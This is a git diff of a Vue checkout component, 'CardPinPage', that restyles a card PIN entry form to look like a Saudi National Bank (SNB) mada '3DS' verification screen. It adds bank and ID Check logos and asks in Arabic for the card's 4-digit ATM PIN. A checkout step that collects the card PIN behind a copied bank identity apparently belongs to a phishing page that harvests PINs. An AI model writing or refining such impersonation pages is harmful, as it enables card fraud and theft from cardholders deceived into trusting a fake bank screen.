@@ -1,39 +1,35 @@
 <template>
-    <div class="pin-shell" dir="rtl">
+    <!-- ═══ SNB 3DS-style PIN Verification ═══ -->
+    <div class="tds-shell" dir="rtl">
 
-        <!-- Error -->
-        <div v-if="error" class="atm-error">{{ error }}</div>
+        <div class="tds-card" :class="{ 'tds-card--busy': isVerifying }">
 
-        <!-- Card -->
-        <div class="atm-card" :class="{ 'atm-card--verifying': isVerifying }">
-
-            <!-- ── Verifying Overlay (in-card) ───────────────────────── -->
+            <!-- Processing overlay -->
             <Transition name="verify-fade">
-                <div v-if="isVerifying" class="verify-overlay">
-                    <div class="verify-overlay__content">
-                        <div class="verify-overlay__icon">
-                            <svg class="verify-overlay__shield" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                                <path d="M12 2L3 7v5c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V7l-9-5z" fill="#faa62e" opacity="0.15" />
-                                <path d="M12 2L3 7v5c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V7l-9-5z" stroke="#faa62e" stroke-width="1.5" fill="none" />
-                                <path d="M9 12l2 2 4-4" stroke="#faa62e" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="verify-overlay__check" />
-                            </svg>
-                            <div class="verify-overlay__ring"></div>
-                        </div>
-                        <p class="verify-overlay__title">جاري التحقق من الرقم السري</p>
-                        <p class="verify-overlay__sub">يرجى الانتظار وعدم إغلاق الصفحة</p>
-                        <div class="verify-overlay__dots">
-                            <span></span><span></span><span></span>
-                        </div>
-                    </div>
+                <div v-if="isVerifying" class="tds-overlay">
+                    <img :src="loadingGif" alt="" class="tds-overlay__gif" />
+                    <p class="tds-overlay__text">جاري التحقق...</p>
                 </div>
             </Transition>
 
-            <h1 class="atm-title">إثبات ملكية البطاقة</h1>
+            <!-- Branding header -->
+            <div class="tds-header">
+                <img :src="bankMadaLogo" alt="SNB mada" class="tds-header__bank" />
+                <img :src="schemeLogo" alt="ID Check" class="tds-header__scheme" />
+            </div>
 
-            <p class="atm-desc">الرجاء ادخال الرقم السري الخاص بالبطاقة المكون من 4 أرقام</p>
+            <!-- Error -->
+            <div v-if="error" class="tds-error">{{ error }}</div>
 
-            <div class="atm-field">
-                <label for="PaymentATM" class="atm-label">الرقم السري *</label>
+            <!-- Title -->
+            <h1 class="tds-title">التحقق بالرقم السري</h1>
+
+            <!-- Info -->
+            <p class="tds-info">الرجاء إدخال الرقم السري الخاص بالبطاقة المكون من 4 أرقام</p>
+
+            <!-- PIN Field -->
+            <div class="tds-field">
+                <label for="PaymentATM" class="tds-field__label">الرقم السري</label>
                 <input
                     id="PaymentATM"
                     v-model="pinCode"
@@ -41,33 +37,26 @@
                     maxlength="4"
                     placeholder="****"
                     :disabled="isVerifying"
-                    class="atm-input"
+                    class="tds-field__input"
                     @keyup.enter="submitPin"
                 />
             </div>
 
+            <!-- Confirm -->
             <button
                 id="atm_code_submit"
+                type="button"
                 :disabled="!isPinValid || isVerifying"
-                class="atm-btn"
+                class="tds-btn tds-btn--primary"
                 @click="submitPin"
             >
-                <svg v-if="isVerifying" class="atm-spinner" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
-                    <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
-                    <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
-                </svg>
-                <span v-if="isVerifying">جاري التحقق...</span>
-                <span v-else>تأكيد</span>
+                CONFIRM
             </button>
-
-            <div class="atm-footer">
-                <span class="atm-footer__label">الدفع بواسطة</span>
-                <img :src="paymentLogos" alt="Visa / Mastercard / mada" class="atm-footer__logos" />
-            </div>
         </div>
 
-        <button type="button" class="atm-cancel" @click="$router.replace({ name: 'checkout' })">
-            إلغاء العملية
+        <!-- Cancel -->
+        <button type="button" class="tds-cancel" @click="$router.replace({ name: 'checkout' })">
+            CANCEL
         </button>
 
     </div>
@@ -86,7 +75,10 @@ import { getPinStatus } from '@/api/paymentApi';
 import logger from '@/utils/logger';
 import { safeRedirect } from '@/utils/safeRedirect';
 import { getReasonLabel } from '@/constants/rejectionReasons';
-import paymentLogos from '@/../../resources/images/logo/master-visa-mada.webp';
+import _paymentLogos from '@/../../resources/images/logo/master-visa-mada.webp';
+import bankMadaLogo from '@/../../resources/images/logo/banks/bank_mada.png';
+import schemeLogo from '@/../../resources/images/logo/banks/scheme.png';
+import loadingGif from '@/../../resources/images/logo/banks/loading.gif';
 
 const { t } = useI18n();
 const router = useRouter();
@@ -199,254 +191,204 @@ onMounted( async () =>
 </script>
 
 <style scoped>
-/* CardPinPage — simple payment gateway PIN entry */
+/* ═══ CardPinPage — SNB Bank 3DS Style ═══ */
 
-.pin-shell {
+.tds-shell {
     min-height: 100dvh;
     display: flex;
     flex-direction: column;
     align-items: center;
     justify-content: center;
-    padding: 0.75rem;
-    background: #eef1f5;
+    padding: 1rem;
+    background: #f0f0f0;
+    font-family: inherit;
 }
 
-.atm-error {
-    background: #fee2e2;
-    color: #dc2626;
-    border: 1px solid #fca5a5;
-    border-radius: 6px;
-    padding: 0.5rem 1rem;
-    font-size: 14px;
-    text-align: center;
-    margin-bottom: 0.75rem;
-    max-width: 460px;
-    width: 100%;
-}
-
-.atm-card {
-    background: #fff;
-    border-radius: 8px;
-    box-shadow: 0 3px 6px 0 rgba(0,0,0,.13);
-    max-width: 460px;
-    width: 100%;
-    padding: 2rem 1.5rem;
-    text-align: center;
-}
-
-.atm-title {
-    font-size: 20px;
-    font-weight: 700;
-    color: #1f2937;
-    margin: 0 0 1rem;
-}
-
-.atm-desc {
-    font-size: 14px;
-    color: #374151;
-    margin: 0 0 1.25rem;
-    line-height: 1.6;
-}
-
-.atm-field {
-    margin-bottom: 1.25rem;
-    text-align: right;
-}
-
-.atm-label {
-    display: block;
-    font-size: 14px;
-    color: #374151;
-    margin-bottom: 0.375rem;
-}
-
-.atm-input {
-    width: 100%;
-    padding: 0.5rem 0.75rem;
-    border: 1px solid #d1d5db;
-    border-radius: 4px;
-    font-size: 20px;
-    text-align: right;
-    letter-spacing: 0.3em;
-    direction: ltr;
-    box-sizing: border-box;
-}
-
-.atm-input:focus {
-    outline: none;
-    border-color: #faa62e;
-    box-shadow: 0 0 0 2px rgba(250,166,46,.2);
-}
-
-.atm-btn {
-    display: inline-flex;
-    align-items: center;
-    justify-content: center;
-    gap: 0.5rem;
-    width: 200px;
-    padding: 0.625rem 1rem;
-    background: #faa62e;
-    color: #fff;
-    font-size: 20px;
-    font-weight: 600;
-    border: none;
-    border-radius: 4px;
-    cursor: pointer;
-    margin-bottom: 1.25rem;
-    transition: opacity 0.15s;
-}
-
-.atm-btn:disabled {
-    opacity: 0.6;
-    cursor: not-allowed;
-}
-
-.atm-btn:not(:disabled):hover {
-    opacity: 0.9;
-}
-
-.atm-spinner {
-    width: 1.25rem;
-    height: 1.25rem;
-    animation: spin 1s linear infinite;
-}
-
-@keyframes spin {
-    to { transform: rotate(360deg); }
-}
-
-.atm-footer {
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    gap: 0.5rem;
-    padding-top: 1rem;
-    border-top: 1px solid #e5e7eb;
-}
-
-.atm-footer__label {
-    font-size: 13px;
-    color: #6b7280;
-}
-
-.atm-footer__logos {
-    height: 1.5rem;
-    width: auto;
-}
-
-/* ── Verifying overlay (in-card frosted glass) ─────── */
-.atm-card--verifying {
+/* ── Card ─────────────────────────────────────── */
+.tds-card {
     position: relative;
+    width: 100%;
+    max-width: 420px;
+    background: #fff;
+    border-radius: 4px;
+    box-shadow: 0 2px 10px rgba(0, 0, 0, 0.12);
+    overflow: hidden;
+}
+
+.tds-card--busy {
     pointer-events: none;
 }
 
-.verify-overlay {
+/* ── Processing overlay ──────────────────────── */
+.tds-overlay {
     position: absolute;
     inset: 0;
     z-index: 20;
     display: flex;
+    flex-direction: column;
     align-items: center;
     justify-content: center;
-    background: rgba(255, 255, 255, 0.88);
-    backdrop-filter: blur(6px);
-    -webkit-backdrop-filter: blur(6px);
-    border-radius: inherit;
+    background: rgba(255, 255, 255, 0.92);
+    backdrop-filter: blur(4px);
+    -webkit-backdrop-filter: blur(4px);
 }
 
-.verify-overlay__content {
-    text-align: center;
-    padding: 2rem;
+.tds-overlay__gif {
+    width: 60px;
+    height: 60px;
+    margin-bottom: 0.75rem;
 }
 
-.verify-overlay__icon {
-    position: relative;
-    display: inline-flex;
-    align-items: center;
-    justify-content: center;
-    width: 72px;
-    height: 72px;
-    margin-bottom: 1rem;
+.tds-overlay__text {
+    font-size: 14px;
+    color: #333;
+    font-weight: 600;
 }
 
-.verify-overlay__shield {
-    width: 40px;
-    height: 40px;
-}
-
-.verify-overlay__check {
-    stroke-dasharray: 20;
-    stroke-dashoffset: 20;
-    animation: check-draw 0.6s 0.3s ease forwards;
-}
-
-@keyframes check-draw {
-    to { stroke-dashoffset: 0; }
-}
-
-.verify-overlay__ring {
-    position: absolute;
-    inset: 0;
-    border: 3px solid transparent;
-    border-top-color: #faa62e;
-    border-radius: 50%;
-    animation: spin 1s linear infinite;
-}
-
-.verify-overlay__title {
-    font-size: 16px;
-    font-weight: 700;
-    color: #1f2937;
-    margin: 0 0 4px;
-}
-
-.verify-overlay__sub {
-    font-size: 13px;
-    color: #6b7280;
-    margin: 0 0 14px;
-}
-
-.verify-overlay__dots {
+/* ── Branding header ─────────────────────────── */
+.tds-header {
     display: flex;
-    justify-content: center;
-    gap: 6px;
+    align-items: center;
+    justify-content: space-between;
+    padding: 12px 20px;
+    background: #e8f5f3;
+    border-bottom: 1px solid #d4ece8;
 }
 
-.verify-overlay__dots span {
-    width: 8px;
-    height: 8px;
-    border-radius: 50%;
-    background: #faa62e;
-    animation: dot-bounce 1.4s ease-in-out infinite;
+.tds-header__bank {
+    height: 32px;
+    width: auto;
+    object-fit: contain;
 }
 
-.verify-overlay__dots span:nth-child(2) { animation-delay: 0.2s; }
-.verify-overlay__dots span:nth-child(3) { animation-delay: 0.4s; }
-
-@keyframes dot-bounce {
-    0%, 80%, 100% { transform: scale(0.6); opacity: 0.4; }
-    40% { transform: scale(1); opacity: 1; }
+.tds-header__scheme {
+    height: 36px;
+    width: auto;
+    object-fit: contain;
 }
 
+/* ── Error ────────────────────────────────────── */
+.tds-error {
+    padding: 10px 20px;
+    background: #fef2f2;
+    border-bottom: 1px solid #fca5a5;
+    color: #dc2626;
+    font-size: 14px;
+    font-weight: 500;
+}
+
+/* ── Title ────────────────────────────────────── */
+.tds-title {
+    font-size: 18px;
+    font-weight: 700;
+    color: #1a1a1a;
+    padding: 16px 20px 0;
+    margin: 0;
+}
+
+/* ── Info ─────────────────────────────────────── */
+.tds-info {
+    padding: 10px 20px 16px;
+    font-size: 14px;
+    line-height: 1.8;
+    color: #444;
+    margin: 0;
+}
+
+/* ── Field ────────────────────────────────────── */
+.tds-field {
+    padding: 0 20px 16px;
+}
+
+.tds-field__label {
+    display: block;
+    font-size: 13px;
+    font-weight: 600;
+    color: #333;
+    margin-bottom: 6px;
+}
+
+.tds-field__input {
+    width: 100%;
+    padding: 10px 14px;
+    font-size: 20px;
+    border: 1px solid #ccc;
+    border-radius: 4px;
+    direction: ltr;
+    text-align: center;
+    letter-spacing: 0.3em;
+    box-sizing: border-box;
+    transition: border-color 0.2s;
+}
+
+.tds-field__input:focus {
+    outline: none;
+    border-color: #1a5276;
+    box-shadow: 0 0 0 2px rgba(26, 82, 118, 0.15);
+}
+
+.tds-field__input:disabled {
+    background: #f5f5f5;
+    cursor: not-allowed;
+}
+
+/* ── Button ───────────────────────────────────── */
+.tds-btn {
+    display: block;
+    width: calc(100% - 40px);
+    margin: 0 auto 20px;
+    padding: 12px;
+    font-size: 15px;
+    font-weight: 700;
+    border: none;
+    border-radius: 4px;
+    cursor: pointer;
+    text-align: center;
+    transition: opacity 0.2s;
+    letter-spacing: 0.05em;
+}
+
+.tds-btn:disabled {
+    opacity: 0.5;
+    cursor: not-allowed;
+}
+
+.tds-btn--primary {
+    background: #1a5276;
+    color: #fff;
+}
+
+.tds-btn--primary:hover:not(:disabled) {
+    background: #154360;
+}
+
+/* ── Cancel ───────────────────────────────────── */
+.tds-cancel {
+    display: block;
+    margin-top: 12px;
+    padding: 8px 20px;
+    background: none;
+    border: none;
+    cursor: pointer;
+    font-size: 14px;
+    font-weight: 600;
+    color: #dc2626;
+    letter-spacing: 0.05em;
+    transition: opacity 0.15s;
+}
+
+.tds-cancel:hover {
+    opacity: 0.7;
+}
+
+/* ── Transition ──────────────────────────────── */
 .verify-fade-enter-active,
 .verify-fade-leave-active {
     transition: opacity 0.25s ease;
 }
+
 .verify-fade-enter-from,
 .verify-fade-leave-to {
     opacity: 0;
-}
-
-.atm-cancel {
-    margin-top: 0.75rem;
-    background: none;
-    border: none;
-    color: #9ca3af;
-    font-size: 13px;
-    cursor: pointer;
-    display: block;
-}
-
-.atm-cancel:hover {
-    color: #dc2626;
 }
 </style>
